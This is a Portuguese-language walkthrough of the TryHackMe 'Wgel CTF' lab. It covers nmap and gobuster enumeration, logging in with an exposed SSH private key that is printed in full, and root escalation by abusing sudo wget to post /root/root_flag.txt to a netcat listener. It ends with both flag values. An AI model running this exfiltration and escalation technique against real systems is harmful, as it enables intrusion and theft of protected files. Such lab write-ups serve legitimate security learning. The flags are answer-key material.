Wgel CTF

Ao iniciar a maquina dei comando nmap para saber as portas daquele IP

    nmap -A IP

apos ver um apache instalado dei um gobuster para ver os diretorios, usei a wordlist commom.txt

    gobuster dr -u IP -w /usr/share/dirb/wordlist/commom.txt

ao encontrar os diretorio /sitemap dei um gobuster novamente mas agora filtrando o /sitemap

    gobuster dir -u IP/sitemap -w /usr/share/dirb/wordlist/commom.txt

assim encontrando a pagina principal do desafio ao procurar na pagina pelo css, js, etc.. encontrava-se 2 informacoes importantes. No codigo fonte do apache tinha mencao a um possivel usuario(jessie) e no /sitemap/index.html tambem tinha mencao a jessie assim dando a entender que seria o usuario jessie

ao vasculhar pelos diretorios do /site map tinha um /.ssh ao abrir tinha uma chave privada RSA 

    -----BEGIN RSA PRIVATE KEY-----
    MIIEowIBAAKCAQEA2mujeBv3MEQFCel8yvjgDz066+8Gz0W72HJ5tvG8bj7Lz380
    m+JYAquy30lSp5jH/bhcvYLsK+T9zEdzHmjKDtZN2cYgwHw0dDadSXWFf9W2gc3x
    W69vjkHLJs+lQi0bEJvqpCZ1rFFSpV0OjVYRxQ4KfAawBsCG6lA7GO7vLZPRiKsP
    y4lg2StXQYuZ0cUvx8UkhpgxWy/OO9ceMNondU61kyHafKobJP7Py5QnH7cP/psr
    +J5M/fVBoKPcPXa71mA/ZUioimChBPV/i/0za0FzVuJZdnSPtS7LzPjYFqxnm/BH
    Wo/Lmln4FLzLb1T31pOoTtTKuUQWxHf7cN8v6QIDAQABAoIBAFZDKpV2HgL+6iqG
    /1U+Q2dhXFLv3PWhadXLKEzbXfsAbAfwCjwCgZXUb9mFoNI2Ic4PsPjbqyCO2LmE
    AnAhHKQNeUOn3ymGJEU9iJMJigb5xZGwX0FBoUJCs9QJMBBZthWyLlJUKic7GvPa
    M7QYKP51VCi1j3GrOd1ygFSRkP6jZpOpM33dG1/ubom7OWDZPDS9AjAOkYuJBobG
    SUM+uxh7JJn8uM9J4NvQPkC10RIXFYECwNW+iHsB0CWlcF7CAZAbWLsJgd6TcGTv
    2KBA6YcfGXN0b49CFOBMLBY/dcWpHu+d0KcruHTeTnM7aLdrexpiMJ3XHVQ4QRP2
    p3xz9QECgYEA+VXndZU98FT+armRv8iwuCOAmN8p7tD1W9S2evJEA5uTCsDzmsDj
    7pUO8zziTXgeDENrcz1uo0e3bL13MiZeFe9HQNMpVOX+vEaCZd6ZNFbJ4R889D7I
    dcXDvkNRbw42ZWx8TawzwXFVhn8Rs9fMwPlbdVh9f9h7papfGN2FoeECgYEA4EIy
    GW9eJnl0tzL31TpW2lnJ+KYCRIlucQUnBtQLWdTncUkm+LBS5Z6dGxEcwCrYY1fh
    shl66KulTmE3G9nFPKezCwd7jFWmUUK0hX6Sog7VRQZw72cmp7lYb1KRQ9A0Nb97
    uhgbVrK/Rm+uACIJ+YD57/ZuwuhnJPirXwdaXwkCgYBMkrxN2TK3f3LPFgST8K+N
    LaIN0OOQ622e8TnFkmee8AV9lPp7eWfG2tJHk1gw0IXx4Da8oo466QiFBb74kN3u
    QJkSaIdWAnh0G/dqD63fbBP95lkS7cEkokLWSNhWkffUuDeIpy0R6JuKfbXTFKBW
    V35mEHIidDqtCyC/gzDKIQKBgDE+d+/b46nBK976oy9AY0gJRW+DTKYuI4FP51T5
    hRCRzsyyios7dMiVPtxtsomEHwYZiybnr3SeFGuUr1w/Qq9iB8/ZMckMGbxoUGmr
    9Jj/dtd0ZaI8XWGhMokncVyZwI044ftoRcCQ+a2G4oeG8ffG2ZtW2tWT4OpebIsu
    eyq5AoGBANCkOaWnitoMTdWZ5d+WNNCqcztoNppuoMaG7L3smUSBz6k8J4p4yDPb
    QNF1fedEOvsguMlpNgvcWVXGINgoOOUSJTxCRQFy/onH6X1T5OAAW6/UXc4S7Vsg
    jL8g9yBg4vPB8dHC6JeJpFFE06vxQMFzn6vjEab9GhnpMihrSCod
    -----END RSA PRIVATE KEY-----

assim era so invadir, fazendo conexao ssh com o usuario jessie.. entretanto tinhamos que baixar o arquivo 

    wget IP/sitemap/.ssh/id_rsa

ao baixar e tentar invadir o RSA nao estava com suas permissoes padroes assim tendo que atualizar suas permissoes

    chmod 600 id_rsa

agora sim se tornando possivel invadir o sistema

    sudo ssh -i id_rsa jessi@IP

entrando no usuario jessi era so procurar pela 1 flag que se encontrava na pasta Documents

    cd Documents
    cat user_flag.txt

assim acessando a 1 flag, para encontrar a segundo o tryhackme ja informou que precisava do usuario 'root' ao dar o comando 

    sudo -l 

vimos que o usuario jessie tinha permissao para executar o /usr/bin/wget como root, assim era so procurar uma forma de acessar para poder procurar a ultima flag no site GTFObins ao procurar wget tinha uma falha para fazer um NETCAT para nossa maquina assim...

tinhamos que saber qual era o arquivo a ser lido, porem nao era possivel vizualizar a pasta root e apos tentar alguns nomes como root/root.txt, deduz-se que poderia ser root/root_user.txt visto que a 1 flag tinha um nome parecido.. apos abrir a porta na sua maquina

    nc -nlvp 1333

era so executar o comando..

    sudo wget --post-file=/root/root_flag.txt IPtryhackme:1333

assim encontrando as 2 flags e finalizando o desafio.

FLAGS

    Flag 1: 057c67131c3d5e42dd5cd3075b198ff6
    Flag 2: b1b968b37519ad1daa6408188649263d
